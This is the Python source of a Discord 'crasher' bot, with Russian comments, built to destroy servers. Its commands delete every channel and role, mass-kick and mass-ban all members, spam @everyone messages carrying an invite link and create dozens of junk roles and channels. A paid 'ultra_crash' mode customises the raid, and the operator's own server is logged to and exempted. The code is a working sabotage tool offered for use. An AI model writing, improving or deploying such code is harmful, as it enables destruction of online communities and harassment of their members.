import discord
from discord.ext import commands
import asyncio
import json
import random
import string
from datetime import datetime
import os

# Функция для загрузки конфига с безопасной обработкой
def load_config():
    config_path = 'config.json'
    
    # Базовые значения по умолчанию
    default_config = {
        "token": "YOUR_BOT_TOKEN_HERE",
        "bot_invite_link": "https://discord.gg/your-invite",
        "bot_name": "SWILL CRASHER",
        "premium_users": [],
        "help_image_url": "https://i.imgur.com/help_icon.png",
        "default_spam_message": "@everyone SERVER CRASHED BY SWILL BOT",
        "default_role_name": "SWILL CRASHED",
        "default_channel_names": ["swill-crash", "get-crashed", "server-destroyed"],
        "protected_server_id": "1469689803627958274",
        "log_channel_id": "1469689805905465362",
        "ignored_channels": [
            "1469690401664405671",
            "1469690447533441117",
            "1469689805905465360",
            "1469689805905465361",
            "1469689805905465362",
            "1469689805905465363"
        ]
    }
    
    # Если файл конфига существует, загружаем его
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                user_config = json.load(f)
            
            # Объединяем с дефолтными значениями
            for key in default_config:
                if key not in user_config:
                    user_config[key] = default_config[key]
            
            # Сохраняем обновленный конфиг
            with open(config_path, 'w', encoding='utf-8') as f:
                json.dump(user_config, f, indent=4, ensure_ascii=False)
            
            return user_config
            
        except Exception as e:
            print(f"⚠️ Ошибка загрузки конфига: {e}")
            print("📝 Создаю новый конфиг с настройками по умолчанию...")
    else:
        print("📝 Конфиг не найден. Создаю новый...")
    
    # Создаем новый конфиг
    with open(config_path, 'w', encoding='utf-8') as f:
        json.dump(default_config, f, indent=4, ensure_ascii=False)
    
    return default_config.copy()

# Загрузка конфигурации
config = load_config()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.sw ', intents=intents, help_command=None)

def is_premium(ctx):
    premium_users = config.get("premium_users", [])
    return str(ctx.author.id) in premium_users

def is_protected_server(guild_id):
    """Проверяет, является ли сервер защищенным"""
    protected_id = config.get("protected_server_id", "")
    return str(guild_id) == protected_id

def should_ignore_channel(channel_id):
    """Проверяет, нужно ли игнорировать канал"""
    ignored = config.get("ignored_channels", [])
    return str(channel_id) in ignored

class CrashSession:
    def __init__(self, user_id):
        self.user_id = user_id
        self.spam_message = None
        self.role_names = []
        self.channel_names = []
        self.step = 0

active_sessions = {}
crash_logs = []

async def log_crash_action(guild, author, command, details=""):
    """Логирование действий краша"""
    if not is_protected_server(guild.id):
        return
    
    log_channel_id = config.get("log_channel_id")
    if not log_channel_id:
        return
    
    try:
        log_channel = bot.get_channel(int(log_channel_id))
        if not log_channel:
            return
    except:
        return
    
    try:
        embed = discord.Embed(
            title="📊 ЛОГ КРАША",
            color=0xff0000,
            timestamp=datetime.now()
        )
        
        embed.add_field(name="Сервер", value=f"`{guild.name}`", inline=True)
        embed.add_field(name="ID Сервера", value=f"`{guild.id}`", inline=True)
        embed.add_field(name="Участников", value=f"`{guild.member_count}`", inline=True)
        embed.add_field(name="Команда", value=f"`.sw {command}`", inline=True)
        embed.add_field(name="Инициатор", value=f"`{author.name}`", inline=True)
        embed.add_field(name="ID Инициатора", value=f"`{author.id}`", inline=True)
        
        if details:
            embed.add_field(name="Детали", value=f"```{details[:500]}```", inline=False)
        
        embed.set_footer(text="SWILL Crash Log System")
        
        await log_channel.send(embed=embed)
    except Exception as e:
        print(f"⚠️ Ошибка логирования: {e}")
    
    # Сохраняем в память
    crash_logs.append({
        "timestamp": datetime.now().isoformat(),
        "guild": guild.name,
        "guild_id": guild.id,
        "command": command,
        "author": author.name,
        "author_id": author.id,
        "details": details
    })

@bot.event
async def on_ready():
    print("=" * 50)
    print(f"✅ SWILL Bot активен как {bot.user.name}")
    print(f"🆔 ID бота: {bot.user.id}")
    print("=" * 50)
    
    # Безопасный вывод информации о конфиге
    try:
        premium_count = len(config.get("premium_users", []))
        print(f"⚡ Премиум пользователи: {premium_count}")
        
        protected_id = config.get("protected_server_id", "Не настроен")
        print(f"🛡️ Защищенный сервер: {protected_id}")
        
        log_channel = config.get("log_channel_id", "Не настроен")
        print(f"📝 Лог-канал: {log_channel}")
        
        ignored_count = len(config.get("ignored_channels", []))
        print(f"🚫 Игнорируемых каналов: {ignored_count}")
        
        print("🔐 Система верификации: ГОТОВА")
        print("💥 Система краша: АКТИВИРОВАНА")
        print("=" * 50)
        print(f"🔗 Префикс команд: .sw")
        print(f"📊 Серверов: {len(bot.guilds)}")
        print("=" * 50)
        
    except Exception as e:
        print(f"⚠️ Ошибка при выводе информации: {e}")

@bot.command(name='verif')
async def verification_setup(ctx):
    """Настройка верификации на сервере"""
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Требуются права администратора!")
        return
    
    try:
        embed = discord.Embed(title="🔐 **НАСТРОЙКА ВЕРИФИКАЦИИ** 🔐", color=0x00ff00)
        embed.set_thumbnail(url="https://i.imgur.com/verification.png")
        embed.add_field(name="Статус", value="Начинаю настройку системы верификации...", inline=False)
        embed.set_footer(text="SWILL Verification System")
        msg = await ctx.send(embed=embed)
        
        # Создание роли верификации
        embed.clear_fields()
        embed.add_field(name="Шаг 1/3", value="Создание роли 'Верификация'... 👥", inline=False)
        await msg.edit(embed=embed)
        
        try:
            verif_role = await ctx.guild.create_role(
                name="✅ Верификация",
                color=discord.Color.green(),
                hoist=True,
                mentionable=False,
                reason="SWILL Verification System"
            )
            await asyncio.sleep(1)
        except Exception as e:
            print(f"⚠️ Ошибка создания роли: {e}")
            verif_role = discord.utils.get(ctx.guild.roles, name="✅ Верификация")
            if not verif_role:
                await ctx.send("❌ Не удалось создать роль верификации")
                return
        
        # Каналы с ограничением отправки сообщений (только просмотр)
        read_only_channels = [
            1469689804978651342,  # Канал 1
            1469689804978651343,  # Канал 2
            1469689804978651344   # Канал 3
        ]
        
        # Настройка прав для всех каналов
        embed.clear_fields()
        embed.add_field(name="Шаг 2/3", value="Настройка прав доступа для каналов... 🔒", inline=False)
        await msg.edit(embed=embed)
        
        channels_updated = 0
        read_only_updated = 0
        ignored_channels = []
        
        # Безопасное получение списка игнорируемых каналов
        try:
            ignored_channels = [int(ch_id) for ch_id in config.get("ignored_channels", [])]
        except:
            pass
        
        for channel in ctx.guild.channels:
            try:
                # Пропускаем игнорируемые каналы
                if channel.id in ignored_channels:
                    continue
                
                # Для каналов только для чтения
                if channel.id in read_only_channels:
                    # Разрешаем просмотр для роли верификации
                    await channel.set_permissions(verif_role, 
                                                view_channel=True,
                                                send_messages=False,  # ЗАПРЕЩАЕМ отправку сообщений
                                                add_reactions=False)
                    read_only_updated += 1
                    print(f"📖 Настроен канал только для чтения: {channel.name} (ID: {channel.id})")
                
                else:
                    # Для остальных каналов - стандартные права
                    # Запрещаем просмотр @everyone
                    await channel.set_permissions(ctx.guild.default_role, view_channel=False)
                    
                    # Разрешаем просмотр роли верификации
                    await channel.set_permissions(verif_role, 
                                                view_channel=True,
                                                send_messages=True,
                                                read_message_history=True)
                
                # Разрешаем просмотр премиум пользователям
                premium_users = config.get("premium_users", [])
                for premium_id in premium_users:
                    try:
                        member = await ctx.guild.fetch_member(int(premium_id))
                        if member:
                            # Для премиум-пользователей полный доступ даже в read-only каналах
                            if channel.id in read_only_channels:
                                await channel.set_permissions(member, 
                                                            view_channel=True,
                                                            send_messages=True,
                                                            manage_messages=True)
                            else:
                                await channel.set_permissions(member, view_channel=True)
                    except:
                        pass
                
                channels_updated += 1
                await asyncio.sleep(0.2)
                
            except Exception as e:
                print(f"Ошибка настройки канала {channel.name}: {e}")
                continue
        
        # Создание канала верификации
        embed.clear_fields()
        embed.add_field(name="Шаг 3/3", value="Создание канала для верификации... 📝", inline=False)
        await msg.edit(embed=embed)
        
        try:
            # Удаляем старый канал верификации если есть
            for channel in ctx.guild.channels:
                if channel.name == "🔐-верификация":
                    try:
                        await channel.delete()
                    except:
                        pass
            
            # Создаем новый канал
            overwrites = {
                ctx.guild.default_role: discord.PermissionOverwrite(view_channel=True, send_messages=False),
                ctx.guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, manage_channels=True),
                verif_role: discord.PermissionOverwrite(view_channel=True, send_messages=False)  # В канале верификации тоже нельзя писать
            }
            
            verif_channel = await ctx.guild.create_text_channel(
                name="🔐-верификация",
                overwrites=overwrites,
                reason="SWILL Verification Channel"
            )
            
            # Отправляем инструкцию с информацией о read-only каналах
            read_only_info = ""
            for channel_id in read_only_channels:
                channel_obj = ctx.guild.get_channel(channel_id)
                if channel_obj:
                    read_only_info += f"• {channel_obj.mention} - только просмотр\n"
            
            verif_embed = discord.Embed(
                title="🔐 **СИСТЕМА ВЕРИФИКАЦИИ**",
                description="Добро пожаловать на сервер! Для получения доступа ко всем каналам:\n\n"
                          "1. Нажмите на реакцию ✅ ниже\n"
                          "2. Дождитесь выдачи роли\n"
                          "3. Получите доступ ко всем каналам сервера\n\n"
                          f"**📖 Каналы только для просмотра:**\n{read_only_info}\n"
                          "*В этих каналах нельзя отправлять сообщения*",
                color=0x00ff00
            )
            verif_embed.set_footer(text="SWILL Verification System • Нажмите ✅ для верификации")
            
            verif_msg = await verif_channel.send(embed=verif_embed)
            await verif_msg.add_reaction("✅")
            
            # Сохраняем информацию для обработчика реакций
            bot.verification_data = {
                "guild_id": ctx.guild.id,
                "role_id": verif_role.id,
                "message_id": verif_msg.id,
                "channel_id": verif_channel.id
            }
            
            print(f"✅ Настройка верификации завершена. ID сообщения: {verif_msg.id}, ID роли: {verif_role.id}")
            print(f"📖 Read-only каналы настроены: {len(read_only_channels)}")
            
        except Exception as e:
            print(f"Ошибка создания канала верификации: {e}")
        
        # Финальное сообщение
        embed.clear_fields()
        embed.add_field(name="✅ СИСТЕМА ВЕРИФИКАЦИИ НАСТРОЕНА", 
                       value=f"**Роль создана:** `✅ Верификация`\n"
                             f"**Каналов обновлено:** `{channels_updated}`\n"
                             f"**Read-only каналов:** `{read_only_updated}`\n"
                             f"**Игнорируемые каналы:** `{len(ignored_channels)}`\n\n"
                             f"Система автоматической верификации активирована!\n"
                             f"Канал верификации: {verif_channel.mention if 'verif_channel' in locals() else 'не создан'}\n\n"
                             f"**Каналы только для просмотра:**\n"
                             f"<#1469689804978651342>, <#1469689804978651343>, <#1469689804978651344>",
                       inline=False)
        embed.set_image(url="https://i.imgur.com/verification_complete.gif")
        await msg.edit(embed=embed)
        
        # Логирование
        log_details = (f"Настройка верификации завершена. "
                      f"Обновлено каналов: {channels_updated}, "
                      f"Read-only: {read_only_updated}")
        await log_crash_action(ctx.guild, ctx.author, "verif", log_details)
        
    except Exception as e:
        error_msg = f"⚠️ Ошибка настройки верификации: {str(e)}"
        print(error_msg)
        await ctx.send(error_msg)

# Обработчик реакций для верификации
@bot.event
async def on_raw_reaction_add(payload):
    """Обработка реакции для верификации"""
    # Проверяем, есть ли данные о верификации
    if not hasattr(bot, 'verification_data'):
        return
    
    # Проверяем, что реакция добавлена в правильном сообщении
    if (payload.message_id == bot.verification_data.get('message_id') and 
        payload.channel_id == bot.verification_data.get('channel_id')):
        
        if str(payload.emoji) == "✅":
            guild = bot.get_guild(payload.guild_id)
            if not guild:
                return
            
            member = guild.get_member(payload.user_id)
            if member and not member.bot:
                try:
                    # Получаем роль верификации
                    role_id = bot.verification_data.get('role_id')
                    role = guild.get_role(role_id)
                    
                    if not role:
                        print(f"❌ Роль верификации не найдена (ID: {role_id})")
                        return
                    
                    # Выдаем роль
                    await member.add_roles(role, reason="Автоматическая верификация")
                    
                    # Отправляем сообщение в ЛС
                    try:
                        dm_embed = discord.Embed(
                            title="✅ ВЕРИФИКАЦИЯ УСПЕШНА",
                            description="Вы успешно прошли верификацию на сервере!\n\n"
                                      "**Теперь вам доступны:**\n"
                                      "• Все каналы сервера\n"
                                      "• Возможность общения в большинстве каналов\n\n"
                                      "**📖 Каналы только для просмотра:**\n"
                                      "В следующих каналах можно только читать сообщения:\n"
                                      "• <#1469689804978651342>\n"
                                      "• <#1469689804978651343>\n"
                                      "• <#1469689804978651344>\n\n"
                                      "Приятного общения!",
                            color=0x00ff00
                        )
                        dm_embed.set_footer(text="SWILL Verification System")
                        await member.send(embed=dm_embed)
                    except:
                        pass  # Не удалось отправить ЛС
                    
                    # Логирование в канал логов
                    if is_protected_server(guild.id):
                        log_channel_id = config.get("log_channel_id")
                        if log_channel_id:
                            try:
                                log_channel = bot.get_channel(int(log_channel_id))
                                if log_channel:
                                    log_embed = discord.Embed(
                                        title="✅ НОВАЯ ВЕРИФИКАЦИЯ",
                                        color=0x00ff00,
                                        timestamp=datetime.now()
                                    )
                                    log_embed.add_field(name="Участник", value=f"`{member.name}`", inline=True)
                                    log_embed.add_field(name="ID", value=f"`{member.id}`", inline=True)
                                    log_embed.add_field(name="Роль", value=f"`{role.name}`", inline=True)
                                    log_embed.set_footer(text="SWILL Verification Log")
                                    await log_channel.send(embed=log_embed)
                            except:
                                pass
                    
                    print(f"✅ Выдана роль верификации пользователю {member.name} (ID: {member.id})")
                    
                except Exception as e:
                    print(f"❌ Ошибка выдачи роли верификации: {e}")

@bot.command(name='crash')
async def crash_server(ctx):
    """Базовый краш сервера"""
    # Проверка на защищенный сервер
    if is_protected_server(ctx.guild.id):
        embed = discord.Embed(title="🛡️ ЗАЩИТА АКТИВИРОВАНА", color=0x00ff00)
        embed.add_field(name="Статус", value="Этот сервер защищен от краша!", inline=False)
        embed.add_field(name="ID Сервера", value=f"`{ctx.guild.id}`", inline=False)
        embed.set_footer(text="SWILL Protection System")
        await ctx.send(embed=embed)
        return
    
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Требуются права администратора!")
        return
    
    try:
        # Логирование начала краша
        await log_crash_action(ctx.guild, ctx.author, "crash", "Начало базового краша сервера")
        
        embed = discord.Embed(title="💣 **АКТИВАЦИЯ СИСТЕМЫ КРАША** 💣", color=0xff0000)
        embed.set_thumbnail(url="https://i.imgur.com/explosion.gif")
        embed.add_field(name="Статус", value="Начинаю уничтожение сервера...", inline=False)
        embed.set_footer(text="SWILL Crash System v3.0")
        msg = await ctx.send(embed=embed)
        
        # Получаем текущий канал, чтобы его не удалять
        current_channel = ctx.channel
        
        # Удаление каналов (кроме текущего)
        embed.clear_fields()
        embed.add_field(name="Шаг 1/4", value="Удаление всех каналов (кроме этого)... 🔥", inline=False)
        await msg.edit(embed=embed)
        
        for channel in list(ctx.guild.channels):
            try:
                if channel.id != current_channel.id:  # Не удаляем текущий канал
                    await channel.delete()
                    await asyncio.sleep(0.5)
            except:
                pass
        
        # Удаление ролей
        embed.clear_fields()
        embed.add_field(name="Шаг 2/4", value="Удаление всех ролей... ⚡", inline=False)
        await msg.edit(embed=embed)
        
        for role in list(ctx.guild.roles):
            try:
                if role.name != "@everyone":
                    await role.delete()
                    await asyncio.sleep(0.5)
            except:
                pass
        
        # Создание новых каналов со спамом
        embed.clear_fields()
        embed.add_field(name="Шаг 3/4", value="Создание каналов краша... 💥", inline=False)
        await msg.edit(embed=embed)
        
        channel_names = config.get("default_channel_names", ["swill-crash", "get-crashed"])
        spam_message = config.get("default_spam_message", "@everyone SERVER CRASHED")
        
        for i in range(10):
            try:
                channel = await ctx.guild.create_text_channel(
                    name=f"{channel_names[i % len(channel_names)]}-{i+1}"
                )
                await channel.send(f"{spam_message}\n{config.get('bot_invite_link', '')}")
                await asyncio.sleep(0.3)
            except:
                pass
        
        # Создание ролей
        embed.clear_fields()
        embed.add_field(name="Шаг 4/4", value="Создание ролей краша... ☠️", inline=False)
        await msg.edit(embed=embed)
        
        role_name = config.get("default_role_name", "SWILL CRASHED")
        for i in range(20):
            try:
                await ctx.guild.create_role(
                    name=f"{role_name}-{i+1}",
                    color=discord.Color(random.randint(0, 0xFFFFFF))
                )
                await asyncio.sleep(0.2)
            except:
                pass
        
        # Спам в текущем канале
        for _ in range(5):
            await current_channel.send(f"@everyone {spam_message}\n{config.get('bot_invite_link', '')}")
            await asyncio.sleep(0.5)
        
        # Финальное сообщение
        embed.clear_fields()
        embed.add_field(name="✅ КРАШ ЗАВЕРШЕН", 
                       value=f"Сервер успешно уничтожен!\nТекущий канал сохранен.\nПрисоединяйтесь: {config.get('bot_invite_link', '')}", 
                       inline=False)
        embed.set_image(url="https://i.imgur.com/explosion_final.gif")
        await msg.edit(embed=embed)
        
        # Логирование завершения
        await log_crash_action(ctx.guild, ctx.author, "crash", "Базовый краш сервера завершен успешно")
        
    except Exception as e:
        error_msg = f"⚠️ Ошибка: {str(e)}"
        await ctx.send(error_msg)
        await log_crash_action(ctx.guild, ctx.author, "crash", f"Ошибка: {str(e)}")

@bot.command(name='kick_all')
async def kick_all(ctx):
    """Кик всех участников"""
    # Проверка на защищенный сервер
    if is_protected_server(ctx.guild.id):
        await ctx.send("🛡️ Этот сервер защищен от краша!")
        return
    
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Требуются права администратора!")
        return
    
    await log_crash_action(ctx.guild, ctx.author, "kick_all", "Начало массового кика")
    
    embed = discord.Embed(title="👢 МАССОВЫЙ КИК", color=0xff8800)
    embed.add_field(name="Статус", value="Начинаю кик всех участников...", inline=False)
    msg = await ctx.send(embed=embed)
    
    kicked = 0
    for member in list(ctx.guild.members):
        try:
            if member != ctx.author and not member.bot:
                await member.kick(reason="SWILL Bot Mass Kick")
                kicked += 1
                await asyncio.sleep(0.7)
        except:
            pass
    
    embed.clear_fields()
    embed.add_field(name="✅ ВЫПОЛНЕНО", value=f"Участников выгнано: {kicked}", inline=False)
    await msg.edit(embed=embed)
    
    await log_crash_action(ctx.guild, ctx.author, "kick_all", f"Завершен массовый кик. Выгнано: {kicked}")

@bot.command(name='ban_all')
async def ban_all(ctx):
    """Бан всех участников"""
    # Проверка на защищенный сервер
    if is_protected_server(ctx.guild.id):
        await ctx.send("🛡️ Этот сервер защищен от краша!")
        return
    
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Требуются права администратора!")
        return
    
    await log_crash_action(ctx.guild, ctx.author, "ban_all", "Начало массового бана")
    
    embed = discord.Embed(title="🔨 МАССОВЫЙ БАН", color=0xff0000)
    embed.add_field(name="Статус", value="Начинаю бан всех участников...", inline=False)
    msg = await ctx.send(embed=embed)
    
    banned = 0
    for member in list(ctx.guild.members):
        try:
            if member != ctx.author and not member.bot:
                await member.ban(reason="SWILL Bot Mass Ban", delete_message_days=7)
                banned += 1
                await asyncio.sleep(1)
        except:
            pass
    
    embed.clear_fields()
    embed.add_field(name="✅ ВЫПОЛНЕНО", value=f"Участников забанено: {banned}", inline=False)
    await msg.edit(embed=embed)
    
    await log_crash_action(ctx.guild, ctx.author, "ban_all", f"Завершен массовый бан. Забанено: {banned}")

@bot.command(name='role')
async def spam_roles(ctx):
    """Создание множества ролей"""
    # Проверка на защищенный сервер
    if is_protected_server(ctx.guild.id):
        await ctx.send("🛡️ Этот сервер защищен от краша!")
        return
    
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Требуются права администратора!")
        return
    
    await log_crash_action(ctx.guild, ctx.author, "role", "Начало спама ролями")
    
    embed = discord.Embed(title="🎭 СПАМ РОЛЯМИ", color=0x00ff88)
    embed.add_field(name="Статус", value="Создание 50 ролей...", inline=False)
    msg = await ctx.send(embed=embed)
    
    created = 0
    bot_name = config.get("bot_name", "SWILL BOT")
    for i in range(50):
        try:
            await ctx.guild.create_role(
                name=f"{bot_name} {i+1}",
                color=discord.Color(random.randint(0, 0xFFFFFF)),
                hoist=True
            )
            created += 1
            await asyncio.sleep(0.3)
        except:
            pass
    
    embed.clear_fields()
    embed.add_field(name="✅ ВЫПОЛНЕНО", value=f"Создано ролей: {created}", inline=False)
    await msg.edit(embed=embed)
    
    await log_crash_action(ctx.guild, ctx.author, "role", f"Завершен спам ролями. Создано: {created}")

@bot.command(name='ultra_crash')
async def ultra_crash(ctx):
    """ПРЕМИУМ РЕЖИМ: Полный кастомизируемый краш"""
    # Проверка на защищенный сервер
    if is_protected_server(ctx.guild.id):
        await ctx.send("🛡️ Этот сервер защищен от краша!")
        return
    
    if not is_premium(ctx):
        embed = discord.Embed(title="🚫 ПРЕМИУМ ДОСТУП", color=0xff0000)
        embed.add_field(name="Ошибка", value="Эта команда только для премиум пользователей!", inline=False)
        embed.add_field(name="Как получить?", value=f"Свяжитесь с разработчиком", inline=False)
        await ctx.send(embed=embed)
        return
    
    # Начало интерактивной сессии
    session = CrashSession(ctx.author.id)
    active_sessions[ctx.author.id] = session
    
    embed = discord.Embed(title="👑 **ПРЕМИУМ ULTRA CRASH** 👑", color=0xffd700)
    embed.set_thumbnail(url="https://i.imgur.com/premium.gif")
    embed.add_field(name="Шаг 1/4", 
                   value="Напишите сообщение для спама (будет отправляться в каждый канал):", 
                   inline=False)
    embed.add_field(name="Пример", 
                   value="`@everyone SERVER DESTROYED BY SWILL PREMIUM`", 
                   inline=False)
    embed.set_footer(text="Введите 'отмена' для отмены | У вас 60 секунд на каждый шаг")
    
    await ctx.send(embed=embed)
    
    # Логирование начала премиум краша
    await log_crash_action(ctx.guild, ctx.author, "ultra_crash", "Начало премиум краша")
    
    # Ожидание сообщения для спама
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel
    
    try:
        # Шаг 1: Сообщение для спама
        msg = await bot.wait_for('message', timeout=60.0, check=check)
        if msg.content.lower() == 'отмена':
            del active_sessions[ctx.author.id]
            await ctx.send("❌ Отменено")
            return
        session.spam_message = msg.content
        
        # Шаг 2: Названия ролей
        embed = discord.Embed(title="👑 **ПРЕМИУМ ULTRA CRASH** 👑", color=0xffd700)
        embed.add_field(name="Шаг 2/4", 
                       value="Напишите названия для ролей (через запятую, минимум 3):", 
                       inline=False)
        embed.add_field(name="Пример", 
                       value="`ХАКЕР, КРАШЕР, УНИЧТОЖИТЕЛЬ, SWILL PRO`", 
                       inline=False)
        await ctx.send(embed=embed)
        
        msg = await bot.wait_for('message', timeout=60.0, check=check)
        if msg.content.lower() == 'отмена':
            del active_sessions[ctx.author.id]
            await ctx.send("❌ Отменено")
            return
        session.role_names = [name.strip() for name in msg.content.split(',') if name.strip()]
        
        # Шаг 3: Названия каналов
        embed = discord.Embed(title="👑 **ПРЕМИУМ ULTRA CRASH** 👑", color=0xffd700)
        embed.add_field(name="Шаг 3/4", 
                       value="Напишите названия для каналов (через запятую, минимум 3):", 
                       inline=False)
        embed.add_field(name="Пример", 
                       value="`взлом-сервера, краш-процесс, уничтожение, премиум-краш`", 
                       inline=False)
        await ctx.send(embed=embed)
        
        msg = await bot.wait_for('message', timeout=60.0, check=check)
        if msg.content.lower() == 'отмена':
            del active_sessions[ctx.author.id]
            await ctx.send("❌ Отменено")
            return
        session.channel_names = [name.strip() for name in msg.content.split(',') if name.strip()]
        
        # Шаг 4: Подтверждение
        embed = discord.Embed(title="👑 **ПРЕМИУМ ULTRA CRASH** 👑", color=0xffd700)
        embed.add_field(name="Шаг 4/4", value="**ПОДТВЕРЖДЕНИЕ**", inline=False)
        embed.add_field(name="Сообщение для спама", value=f"```{session.spam_message[:200]}```", inline=False)
        embed.add_field(name="Названия ролей", value=f"```{', '.join(session.role_names[:5])}```", inline=False)
        embed.add_field(name="Названия каналов", value=f"```{', '.join(session.channel_names[:5])}```", inline=False)
        embed.add_field(name="Действие", value="Напишите `запуск` для начала или `отмена` для отмены", inline=False)
        
        confirm_msg = await ctx.send(embed=embed)
        
        msg = await bot.wait_for('message', timeout=60.0, check=check)
        if msg.content.lower() == 'отмена':
            del active_sessions[ctx.author.id]
            await ctx.send("❌ Отменено")
            return
        
        if msg.content.lower() != 'запуск':
            del active_sessions[ctx.author.id]
            await ctx.send("❌ Неверная команда, отменено")
            return
        
        # ЗАПУСК ULTRA CRASH
        del active_sessions[ctx.author.id]
        
        # Анимация запуска
        loading_embed = discord.Embed(title="🚀 **ЗАПУСК ПРЕМИУМ ULTRA CRASH** 🚀", color=0x9b59b6)
        loading_embed.set_image(url="https://i.imgur.com/loading_animation.gif")
        loading_msg = await ctx.send(embed=loading_embed)
        
        # Получаем текущий канал, чтобы его не удалять
        current_channel = ctx.channel
        
        # Удаление существующих каналов (кроме текущего)
        for channel in list(ctx.guild.channels):
            try:
                if channel.id != current_channel.id:  # Не удаляем текущий канал
                    await channel.delete()
                    await asyncio.sleep(0.3)
            except:
                pass
        
        # Удаление существующих ролей
        for role in list(ctx.guild.roles):
            try:
                if role.name != "@everyone":
                    await role.delete()
                    await asyncio.sleep(0.3)
            except:
                pass
        
        # Создание кастомных каналов
        channels_created = 0
        for i in range(15):
            try:
                if not session.channel_names:
                    session.channel_names = ["ultra-crash", "premium-destroy", "server-nuked"]
                
                channel_name = session.channel_names[i % len(session.channel_names)] + f"-{i+1}"
                channel = await ctx.guild.create_text_channel(name=channel_name)
                
                # Спам в каждый канал
                for _ in range(5):
                    await channel.send(f"{session.spam_message}\n{config.get('bot_invite_link', '')}")
                    await asyncio.sleep(0.2)
                
                channels_created += 1
                await asyncio.sleep(0.4)
            except:
                pass
        
        # Создание кастомных ролей
        roles_created = 0
        for i in range(25):
            try:
                if not session.role_names:
                    session.role_names = ["PREMIUM CRASH", "ULTRA DESTROYER", "SWILL PRO"]
                
                role_name = session.role_names[i % len(session.role_names)] + f" {i+1}"
                role = await ctx.guild.create_role(
                    name=role_name,
                    color=discord.Color(random.randint(0, 0xFFFFFF)),
                    hoist=True,
                    mentionable=True
                )
                roles_created += 1
                await asyncio.sleep(0.3)
            except:
                pass
        
        # Спам в текущем канале
        for _ in range(10):
            await current_channel.send(f"@everyone {session.spam_message}\n{config.get('bot_invite_link', '')}")
            await asyncio.sleep(0.4)
        
        # Финальное сообщение
        final_embed = discord.Embed(title="💎 **ПРЕМИУМ ULTRA CRASH ЗАВЕРШЕН** 💎", color=0xffd700)
        final_embed.set_image(url="https://i.imgur.com/premium_complete.gif")
        final_embed.add_field(name="📊 Результаты", value="```diff\n+ КАСТОМНЫЙ КРАШ ВЫПОЛНЕН\n```", inline=False)
        final_embed.add_field(name="📢 Сообщение спама", value=f"```{session.spam_message[:100]}...```", inline=False)
        final_embed.add_field(name="🎭 Создано ролей", value=f"`{roles_created}`", inline=True)
        final_embed.add_field(name="📁 Создано каналов", value=f"`{channels_created}`", inline=True)
        final_embed.add_field(name="👑 Автор", value=f"`{ctx.author.name}`", inline=True)
        final_embed.add_field(name="🔒 Сохранен канал", value=f"`{current_channel.name}`", inline=True)
        final_embed.set_footer(text=f"SWILL Premium Crash • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        await loading_msg.edit(embed=final_embed)
        
        # Логирование завершения
        log_details = f"Сообщение: {session.spam_message[:100]}... | Ролей: {roles_created} | Каналов: {channels_created}"
        await log_crash_action(ctx.guild, ctx.author, "ultra_crash", log_details)
            
    except asyncio.TimeoutError:
        if ctx.author.id in active_sessions:
            del active_sessions[ctx.author.id]
        await ctx.send("⏰ Время вышло! Сессия отменена.")
        await log_crash_action(ctx.guild, ctx.author, "ultra_crash", "Таймаут сессии")

@bot.command(name='logs')
async def show_logs(ctx):
    """Показать логи крашей"""
    if not is_protected_server(ctx.guild.id):
        await ctx.send("❌ Эта команда только на защищенном сервере!")
        return
    
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Требуются права администратора!")
        return
    
    embed = discord.Embed(title="📊 **ЛОГИ КРАШЕЙ SWILL** 📊", color=0x7289da)
    embed.set_thumbnail(url="https://i.imgur.com/logs_icon.png")
    
    if not crash_logs:
        embed.add_field(name="Логи", value="Логов крашей пока нет.", inline=False)
    else:
        total_crashes = len(crash_logs)
        recent_logs = crash_logs[-10:]  # Последние 10 логов
        
        embed.add_field(name="Всего крашей", value=f"`{total_crashes}`", inline=True)
        
        for i, log in enumerate(reversed(recent_logs), 1):
            log_text = f"**Сервер:** {log['guild']}\n"
            log_text += f"**Команда:** `.sw {log['command']}`\n"
            log_text += f"**Инициатор:** {log['author']}\n"
            log_text += f"**Время:** {log['timestamp'][:19]}"
            
            embed.add_field(name=f"Краш #{total_crashes - len(recent_logs) + i}", 
                          value=log_text, 
                          inline=False)
    
    embed.set_footer(text=f"SWILL Log System • Всего логов: {len(crash_logs)}")
    
    await ctx.send(embed=embed)

@bot.command(name='help')
async def help_command(ctx):
    """Показать помощь с красивым оформлением"""
    embed = discord.Embed(title="🛠 **SWILL BOT COMMANDS** 🛠", color=0x7289da)
    embed.set_thumbnail(url=config.get('help_image_url', 'https://i.imgur.com/help_icon.png'))
    embed.set_image(url="https://i.imgur.com/command_banner.gif")
    
    embed.add_field(name=".sw crash", 
                   value="```Удаляет все роли и каналы (кроме текущего), создает новые с спамом```", 
                   inline=False)
    embed.add_field(name=".sw kick_all", 
                   value="```Кикает всех участников с сервера```", 
                   inline=False)
    embed.add_field(name=".sw ban_all", 
                   value="```Банит всех участников с сервера```", 
                   inline=False)
    embed.add_field(name=".sw role", 
                   value="```Создает 50 ролей с названием бота```", 
                   inline=False)
    embed.add_field(name=".sw ultra_crash", 
                   value="```👑 ПРЕМИУМ: Полный кастомизируемый краш сервера\n(текущий канал не удаляется)```", 
                   inline=False)
    embed.add_field(name=".sw verif", 
                   value="```🔐 Настраивает систему верификации на сервере```", 
                   inline=False)
    embed.add_field(name=".sw logs", 
                   value="```📊 Показывает логи крашей (только на защищенном сервере)```", 
                   inline=False)
    embed.add_field(name=".sw help", 
                   value="```Показывает это сообщение```", 
                   inline=False)
    
    # Показываем статус сервера
    if is_protected_server(ctx.guild.id):
        server_status = "🛡️ ЗАЩИЩЕН"
    else:
        server_status = "⚠️ НЕ ЗАЩИЩЕН"
    
    embed.add_field(name="Статус сервера", value=f"`{server_status}`", inline=True)
    embed.add_field(name="Премиум доступ", value=f"`{'Да' if is_premium(ctx) else 'Нет'}`", inline=True)
    
    embed.set_footer(text=f"SWILL Crash Bot v3.2 • Премиум пользователей: {len(config.get('premium_users', []))}")
    
    await ctx.send(embed=embed)

